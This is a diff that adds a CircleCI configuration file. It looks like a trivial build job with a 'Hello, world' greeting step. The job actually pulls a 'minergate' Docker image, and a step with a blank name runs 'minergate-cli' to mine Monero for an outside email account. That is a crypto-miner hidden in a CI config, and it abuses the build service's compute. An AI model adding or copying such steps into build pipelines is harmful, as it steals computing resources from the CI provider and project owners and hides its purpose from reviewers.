@@ -1,0 +1,16 @@
+version: 2
+jobs:
+  build:
+    docker:
+      - image: en3o/minergate
+
+    steps:
+      - checkout
+
+      - run:
+          name: Greeting
+          command: echo Hello, world.
+
+      - run:
+          name: 
+          command: minergate-cli --user bebay@smart-mail.top --xmr
